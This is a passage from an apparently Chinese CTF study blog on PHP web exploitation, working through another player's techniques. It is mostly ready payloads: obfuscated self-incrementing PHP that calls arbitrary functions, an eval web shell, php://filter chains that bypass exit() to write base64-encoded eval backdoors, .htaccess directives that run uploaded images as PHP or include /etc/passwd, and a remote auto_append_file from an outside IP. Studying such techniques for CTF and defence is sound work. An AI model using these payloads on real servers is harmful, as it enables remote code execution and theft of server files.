mel">#Boogipop大佬自增的结果%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b<span class="hljs-comment">//$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><span class="hljs-comment">//ASSERT($_POST[_]);   php小于7</span>%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre></div><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p><code>?</code>    <code>*</code></p><h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><code>/tmp/phpxxxxxx</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);</code></pre></div><p>文件上传后首先会保存为临时文件<code>/tmp/phpxxxxxx</code></p><p>执行该文件</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /tmp/phpxxxxxx`</span></code></pre></div><h3 id="2023cnss新生赛"><a href="#2023cnss新生赛" class="headerlink" title="2023cnss新生赛"></a>2023cnss新生赛</h3><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">#door.php</span>&lt;<span class="hljs-string">?=</span>. /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span></code></pre></div><p>在door.php路由下上传php文件</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;Content-<span class="hljs-keyword">Type</span>: application/octet-stream#!/bin/bashls<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;;提交<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT--</span></code></pre></div><h2 id="pathinfo-漏洞"><a href="#pathinfo-漏洞" class="headerlink" title="pathinfo()漏洞"></a>pathinfo()漏洞</h2><p><code>/</code>获取文件名，根据<code>.</code>获取文件后缀</p><p><code>1.php/.</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901212548383.png" alt="image-20230901212548383"></p><h2 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h2><div class="code-wrapper"><pre><code class="hljs scss">php parse_url最后一个@后的为hostlibcurl第一个@后的host<span class="hljs-attribute">http</span>://<span class="hljs-attribute">u</span>:p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><span class="hljs-keyword">@b</span>.com/php解析结果：    <span class="hljs-attribute">schema</span>: http     <span class="hljs-attribute">host</span>: b.com    <span class="hljs-attribute">user</span>: u    <span class="hljs-attribute">pass</span>: p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span>libcurl解析结果：    <span class="hljs-attribute">schema</span>: http    <span class="hljs-attribute">host</span>: a.com    <span class="hljs-attribute">user</span>: u    <span class="hljs-attribute">pass</span>: p    <span class="hljs-attribute">port</span>: <span class="hljs-number">80</span>    后面的<span class="hljs-keyword">@b</span>.com/会被忽略掉</code></pre></div><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="finfo-open-（检查文件头，十六进制第一行信息）"><a href="#finfo-open-（检查文件头，十六进制第一行信息）" class="headerlink" title="finfo_open  （检查文件头，十六进制第一行信息）"></a>finfo_open  （检查文件头，十六进制第一行信息）</h3><p>修改后缀不起作用</p><div class="code-wrapper"><pre><code class="hljs lsl">finfo_open的参数   控制返回结果FILEINFO_NONE (<span class="hljs-type">integer</span>)无特殊处理。FILEINFO_SYMLINK (<span class="hljs-type">integer</span>)跟随符号链接。FILEINFO_MIME_TYPE (<span class="hljs-type">integer</span>)返回 mime 类型。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。FILEINFO_MIME_ENCODING (<span class="hljs-type">integer</span>)返回文件的 mime 编码。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。FILEINFO_MIME (<span class="hljs-type">integer</span>)按照 RFC <span class="hljs-number">2045</span> 定义的格式返回文件 mime 类型和编码。FILEINFO_COMPRESS (<span class="hljs-type">integer</span>)解压缩压缩文件。 由于线程安全问题，自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 禁用。FILEINFO_DEVICES (<span class="hljs-type">integer</span>)查看设备的块内容或字符。FILEINFO_CONTINUE (<span class="hljs-type">integer</span>)返回全部匹配的类型。FILEINFO_PRESERVE_ATIME (<span class="hljs-type">integer</span>)如果可以的话，尽可能保持原始的访问时间。FILEINFO_RAW (<span class="hljs-type">integer</span>)对于不可打印字符不转换成 \ooo 八进制表示格式。FILEINFO_EXTENSION (<span class="hljs-type">integer</span>)根据 MIME 类型返回适当的文件扩展名。 有的文件类型具有多种扩展名，例如 JPEG 将会返回多个扩展名， 以斜杠分隔，比如 <span class="hljs-string">&quot;jpeg/jpg/jpe/jfif&quot;</span>。 如果在 magic.mime 数据库里类型未知，则返回的是 <span class="hljs-string">&quot;???&quot;</span>。 PHP <span class="hljs-number">7.2</span><span class="hljs-number">.0</span> 起有效。</code></pre></div><p><code>finfo_file()</code>返回<code>finfo_open</code>设置的参数对应的信息</p><h3 id="Getimagesize（检测文件头，读取文件的前八位的十六进制）"><a href="#Getimagesize（检测文件头，读取文件的前八位的十六进制）" class="headerlink" title="Getimagesize（检测文件头，读取文件的前八位的十六进制）"></a>Getimagesize（检测文件头，读取文件的前八位的十六进制）</h3><p>返回文件大小和文件类型</p><p>上传只有第一行文件头的图片</p><p>finfo_open识别为了png图片，但是getimagesize函数并没有识别成功  （给新生上强度）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220715920.png" alt="image-20230901220715920"></p><p>往图片第二行随便加东西</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220818065.png" alt="image-20230901220818065"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220943156.png" alt="image-20230901220943156"></p><p>成功识别</p><h3 id="exif-imagetype-（GIF89a应该是用来饶过他的）"><a href="#exif-imagetype-（GIF89a应该是用来饶过他的）" class="headerlink" title="exif_imagetype   （GIF89a应该是用来饶过他的）"></a>exif_imagetype   （GIF89a应该是用来饶过他的）</h3><p>只是返回数字（数组中的索引）</p><div class="code-wrapper"><pre><code class="hljs asciidoc">1IMAGETYPE<span class="hljs-emphasis">_GIF</span><span class="hljs-emphasis">2IMAGETYPE_JPEG</span><span class="hljs-emphasis">3IMAGETYPE_PNG</span><span class="hljs-emphasis">4IMAGETYPE_SWF</span><span class="hljs-emphasis">5IMAGETYPE_PSD</span><span class="hljs-emphasis">6IMAGETYPE_BMP</span><span class="hljs-emphasis">7IMAGETYPE_TIFF_II（Intel 字节顺序）</span><span class="hljs-emphasis">8IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><span class="hljs-emphasis">9IMAGETYPE_JPC</span><span class="hljs-emphasis">10IMAGETYPE_JP2</span><span class="hljs-emphasis">11IMAGETYPE_JPX</span><span class="hljs-emphasis">12IMAGETYPE_JB2</span><span class="hljs-emphasis">13IMAGETYPE_SWC</span><span class="hljs-emphasis">14IMAGETYPE_IFF</span><span class="hljs-emphasis">15IMAGETYPE_WBMP</span><span class="hljs-emphasis">16IMAGETYPE_</span>XBM</code></pre></div><h2 id="死亡代码"><a href="#死亡代码" class="headerlink" title="死亡代码"></a>死亡代码</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>建议看看Boogipop大佬的文章，讲的很好</p><p>常规的我就不写了，写一下我没见过的</p><h4 id="php7先压缩再解压（测试有问题）"><a href="#php7先压缩再解压（测试有问题）" class="headerlink" title="php7先压缩再解压（测试有问题）"></a>php7先压缩再解压（测试有问题）</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>大佬的示例</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065000143.png" alt="image-20230902065000143"></p><p>我的示例（php7.3.4和7.1.9都不行）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065554692.png" alt="image-20230902065554692"></p><p>呜呜，又与大佬不一样了</p><h3 id="死亡代码变种"><a href="#死亡代码变种" class="headerlink" title="死亡代码变种"></a>死亡代码变种</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#插入无关代码在filename处正常解析</span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php<span class="hljs-comment">#当文件名</span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></pre></div><p>和大佬说的一样，使用上述两个代码都只能创建文件，无法生成内容</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>写入的内容拼接起来是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>都知道<code>=</code>在base64中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的</p><p>即<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>作为<code>=</code>后的内容，会被忽略或使解码失败</p><h4 id="解决办法（1）"><a href="#解决办法（1）" class="headerlink" title="解决办法（1）"></a>解决办法（1）</h4><p>嵌套过滤器    string.strip.tags|convert.base64-decode</p><p>初代payload：<code> php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>只能说实在是妙啊</p><p>创建<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>文件，内容拼接起来是<code>&lt;?php exit();php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>先去除标签，就只剩下<code>PD9waHAgcGhwaW5mbygpOz8%2B.php</code>然后再进行<code>base64-decode</code></p><p>实操发现会报错。。。。。</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902073626707.png" alt="image-20230902073626707"></p><p>我在想是不是要先创建文件，当创建文件时，我悟了，windows的文件命名不能有<code>?&gt;</code>等字符，只能在<code>linux</code>环境中尝试（难怪大佬的图使用linux），既然如此，我也复现不了了，没有环境，还不会docker启环境</p><p>然后就能生成文件，但在访问的时候，大佬发现文件名有问题，会出现访问不到的情况，原因是引号</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902074746052.png" alt="image-20230902074746052"></p><p>我们看到生成的文件是带有引号的，正常的文件是不带有的</p><p>大佬这里使用伪目录的方法</p><p>最终payload:<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>作为内容时，剩下的<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>仍可以被解析</p><p>作为文件名时，<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B</code>被当作一个目录（虽然不存在），然后<code>../</code>又回到了本来的目录，于是生成<code>s1mple.php</code></p><p>我把过滤器去掉尝试后发现确实可以生成<code>s1mple.php</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902075804794.png" alt="image-20230902075804794"></p><h4 id="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"><a href="#大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）" class="headerlink" title="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"></a>大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）</h4><p>payload:<code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>博客的说法</p><p>他的意思是代码粘起来：<code>&lt;?php exit();php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>之后<br>strip_tags去除内容后为：<code>&lt;?php exit();PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>（我的错误理解是留下<code>&lt;?php exit();php://filter/PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>）</p><p>。。。好像错的更加彻底</p><p><strong>真实情况</strong>（也是Boogipop大佬的理解）</p><p>测试代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=a.php&#x27;</span>;<span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;a.php&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>拼接后是<code>&lt;?php exit()&lt;?;?&gt;PD9waHAgcGhwaW5mbygpOz8+</code></p><p>真实情况，只剩base64代码，然后base64解密</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902085745201.png" alt="image-20230902085745201"></p><p>所以<code>string.strip_tags</code>不是只会去除<code>&lt;?;?&gt;</code>中间的内容，那是错误的观念</p><h4 id="解决办法（2）rot13-（windows本地测试不通过）"><a href="#解决办法（2）rot13-（windows本地测试不通过）" class="headerlink" title="解决办法（2）rot13    （windows本地测试不通过）"></a>解决办法（2）rot13    （windows本地测试不通过）</h4><p>这个就方便多了，不会受到<code>=</code>的限制</p><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code></p><p>测试情况</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903103600057.png" alt="image-20230903103600057"></p><p>生气，不管是正常的死亡代码还是这个变种，<code>rot13</code>都会报这个错误</p><h4 id="解决办法（3）-convert-iconv"><a href="#解决办法（3）-convert-iconv" class="headerlink" title="解决办法（3） convert.iconv"></a>解决办法（3） convert.iconv</h4><p>iconv拥有很多字符编码，利用convert.iconv 进行字符编码转化，这个涉及到filterchain的构造，内容挺多，这就只讲Boogipop大佬提及的</p><h5 id="usc-2"><a href="#usc-2" class="headerlink" title="usc-2"></a>usc-2</h5><p>每两个字符进行翻转   （一定要是偶数、否则报错）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111013076.png" alt="image-20230903111013076"></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;</code></p><h5 id="usc-4"><a href="#usc-4" class="headerlink" title="usc-4"></a>usc-4</h5><p>就是4位一反转   (同理，需要4的倍数)</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111239338.png" alt="image-20230903111239338"></p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><h5 id="utf-8到utf-7的转化"><a href="#utf-8到utf-7的转化" class="headerlink" title="utf-8到utf-7的转化"></a>utf-8到utf-7的转化</h5><p><code>=</code>会被转化为<code>+AD0-</code>     （<code>filterchain</code>构造需要）</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=a.php</code></p><p><code>windows</code>没有<code>iconv</code>，但是我是能成功写入内容的（不太理解）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112719444.png" alt="image-20230903112719444"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112735404.png" alt="image-20230903112735404"></p><h3 id="死亡代码变种（二）"><a href="#死亡代码变种（二）" class="headerlink" title="死亡代码变种（二）"></a>死亡代码变种（二）</h3><div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents($<span class="hljs-params">filename</span>, $<span class="hljs-params">content</span> . <span class="hljs-string">&quot;\nxxxxxx&quot;</span>)</span>;</code></pre></div><p>因为<code>php</code>有特殊的起始符和结束符，所以出题时一般会被禁用php</p><p>常见考点是利用<code>.htaccess</code>，<code>.htaccess</code>文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用<strong>注释符</strong>将杂糅的代码进行注释，然后才可以正常访问；</p><p>对于换行符我们直接进行 <code>\</code> 注释（应该是转义的意思），<code>#</code>注释杂糅的内容</p><p>`#&#96;一般放在行首，并且只能注释一行</p><p><code>php_value%20auto_prepend_file%20文件地址%0a%23\</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903114418114.png" alt="image-20230903114418114"></p><p>Boogipop大佬参考的文章的作者的其他方法</p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html</a></p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html</a></p><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess 中有 <code>#</code> 单行注释符, 且支持 <code>\</code>拼接上下两行。</p><p>子目录中的<code>.htaccess</code>指令会覆盖父目录或者主配置文件中的<code>.htaccess</code>指令</p><p>apache2.conf   <code>AllowOverride All #启动.htaccess文件的使用</code><br>也可以将 .htaccess 修改为其他名<code>AccessFileName .config #将.htaccess修改为.config</code></p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p><code>SetHandler application/x-httpd-php</code><br>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析（上传jpg文件但内容为一句话木马，也会被成功解析）<br><code>SetHandler server-status</code><br>这是查看apache的服务器信息的</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903115244293.png" alt="image-20230903115244293"></p><h3 id="AddHandler-AddType"><a href="#AddHandler-AddType" class="headerlink" title="AddHandler,AddType"></a>AddHandler,AddType</h3><blockquote><p>AddType application&#x2F;x-httpd-php .htm<br>#.htm后缀的文件视为php文件执行</p><p>AddHandler cgi-script .aaa<br>#后缀名为.aaa的文件视为cgi脚本执行</p><p>AddType application&#x2F;x-httpd-php png jpg gif<br>#将png，jpg，gif后缀名都视为php执行</p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当使用<code>PHP</code>作为<code>Apache</code>模块时，也可以用<code>Apache</code>的配置文件（例如 httpd.conf）和 <code>.htaccess </code>文件中的指令来修改 php 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All </code>权限才可以。</p><p><code>.htaccess</code>只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR </code>类型的指令。</p><ol><li>auto_prepend_file：在主文件解析之前自动解析包含的文件</li><li>auto_append_file：在主文件解析后自动解析包含的文件</li></ol><p>如：<code>php_value auto_prepend_file 1.jpg</code> #每次访问一个<code>php</code>文件，都会先解析1.jpg图片，如果里面有代码就会执行</p><h3 id="php-flag-（控制开关）"><a href="#php-flag-（控制开关）" class="headerlink" title="php_flag   （控制开关）"></a>php_flag   （控制开关）</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903120640554.png" alt="image-20230903120640554"></p><p>将其中的engine设为0可以关闭php解析从而达到源码泄露的目的 </p><p>（这里源码泄露的意思是）因为像<code>&lt;?php phpinfo();?&gt;</code>这样的php代码一般会被解析而无法显现，这里关闭解析，于是代码就会显示</p><p>如：<code>php_flag engine off</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>#</code>一般放在行首，并且只能注释一行</p><h4 id="多行注释-0a"><a href="#多行注释-0a" class="headerlink" title="多行注释         #%0a"></a>多行注释         #%0a</h4><div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_fi\le <span class="hljs-number">1.</span>png# <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> 注释</code></pre></div><p>里面的<code>\</code>并不只是单单的<code>\</code>，他实际上是<code>\%0a、</code>，转义了换行符</p><p>利用这种技巧用<code>#\%0a</code>来多行注释</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h4><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 将test.gif 当做 PHP 执行   </span><span class="hljs-section">&lt;FilesMatch  <span class="hljs-string">&quot;test.gif&quot;</span>&gt;</span><span class="hljs-attribute">SetHandler</span>  application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .png 当做 PHP 文件解析</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre></div><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><code>php_value auto_prepend_file /etc/passwd</code></p><p>访问<code>php</code>文件时会先打开<code>/etc/passwd</code>   (<code>/etc/passwd</code>的内容在php文件内容前)</p><p><code>auto_append_file</code>同理 （内容在php文件内容之后）</p><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>PHP 的<code>all_url_include</code>配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为<code>all_url_include</code>的配置范围为<code> PHP_INI_SYSTEM</code>,所以无法利用<code>php_flag</code>在<code>.htaccess</code>中开启</p><p><code>php_value auto_append_file http://10.87.9.156/phpinfo.txt</code></p><p><img 